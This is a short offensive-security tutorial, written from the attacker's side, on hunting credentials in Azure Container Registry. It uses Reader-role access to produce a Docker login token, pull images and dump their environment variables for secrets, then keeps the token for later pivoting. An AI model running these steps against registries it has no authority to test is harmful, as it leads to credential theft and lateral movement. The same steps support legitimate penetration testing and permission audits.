# Hunting credentials in Azure Container Registry

### For many Azure services, Microsoft usually keeps a separation between management plane access and data plane access. This means that explicit permissions beyond the typical management roles are needed to access data stored within services. This architecture was not implemented for the ACR service. It is an interesting architecture choice, but Azure users with Reader permissions on any Azure container registries have rights to connect to the container registry and access images. These users do not have any rights to push modified images back to the registry, but they are able to download and run container images locally. This allows us, as attackers, to review the contents of the images and potentially find issues in the application code, access secrets used by the application, and pivot with those secrets into other applications and services. 

### The process to do this is very simple. As an authenticated user, with Reader or higher permissions on the registry, we can generate a Docker login from the Azure CLI.

## Steps

#### 1) Authenticate to the Azure environment using the reader role

    az login -u READER_USER@DOMAIN.LOCAL -p PASSWORD 

#### 2) List the container registries in the subscription

    az acr list -o table 

### Generate a Docker login for the registry

#### 3) Store the container registry in a variable

    acr=ACR_NAME 

    loginserver=$(az acr login -n $acr --expose-token --query loginServer -o tsv)

    accesstoken=$(az acr login -n $acr --expose-token --query accessToken -o tsv)

    docker login $loginserver -u 00000000-0000-0000-0000-000000000000 -p $accesstoken

#### 4) List the images in the container registry

    az acr repository list -n $acr 

#### 5) List the tags for a specific container registry to enumerate image versions

    az acr repository show-tags -n $acr --repository REPOSITORY

#### 6) Pull the image from the container registry
 
    docker pull $loginserver/REPOSITORY:v1

#### 7) Check the downloaded image for sensitive credentials by listing our environment variables

    docker container run --rm $loginserver/REPOSITORY:v1 env

### Make note of the registry credentials for further usage

    echo $loginserver

    echo $accesstoken
   

